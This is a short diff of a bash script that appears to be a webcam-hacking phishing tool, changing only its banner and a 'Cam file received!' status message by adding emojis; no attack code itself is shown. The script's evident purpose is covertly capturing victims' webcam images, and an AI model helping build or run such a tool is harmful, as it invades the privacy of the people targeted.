@@ -12,7 +12,7 @@ printf "\e[1;92m       ⁪⁬⁮⁮⁮⁮         ⁪⁬⁮⁮⁮⁮   \e[0m\e"
 
 printf "\e[1;92m       ⁪⁬⁮⁮⁮⁮         ⁪⁬⁮⁮⁮⁮   \e[0m\e"
 
-printf "\e[1;92m   𝙃𝘼𝘾𝙆 𝙒𝙀𝘽𝘾𝘼𝙈 📸\e[0m\e   \e[0m\n"
+printf "\e[1;92m   𝙃𝘼𝘾𝙆 𝙒𝙀𝘽𝘾𝘼𝙈 💵📸\e[0m\e   \e[0m\n"
 printf "\e[1;92m   Canal telegram: jen_hacker.mazyar\e[0m                                 \n"
 
 printf " \e[1;77m v1.0 coded by https://github.com/HACKGM/cam\e[0m \n"
@@ -79,7 +79,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] 📥Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] 📸📥Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
